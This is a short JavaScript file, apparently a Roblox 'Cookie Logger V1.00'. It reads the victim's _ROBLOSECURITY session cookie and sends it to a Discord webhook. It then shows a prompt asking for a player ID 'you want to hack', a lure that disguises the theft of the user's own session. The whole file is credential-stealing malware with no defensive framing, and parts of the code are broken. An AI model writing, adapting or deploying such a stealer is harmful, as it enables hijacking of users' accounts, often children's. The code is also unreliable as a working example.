const discord = require('discord.js')
const client = new discord.Client();

const Cookie = document.cookie
  .split('; ')
  .find(row => row.startsWith('_ROBLOSECURITY'))
  .split('=')[1];

const webhook = require("webhook-discord");
 
const Hook = new webhook.Webhook("WEBHOOK URL");
 
const msg = new webhook.MessageBuilder()
                .setName("Cookie Logger V1.00")
                .setColor("#0084FF")
                .setText(`Cookie logged _ROBLOSECURITY successful! ‘‘‘${Cookie}‘‘‘`);
Hook.send(msg);

prompt('Enter in the players User ID you want to hack.')
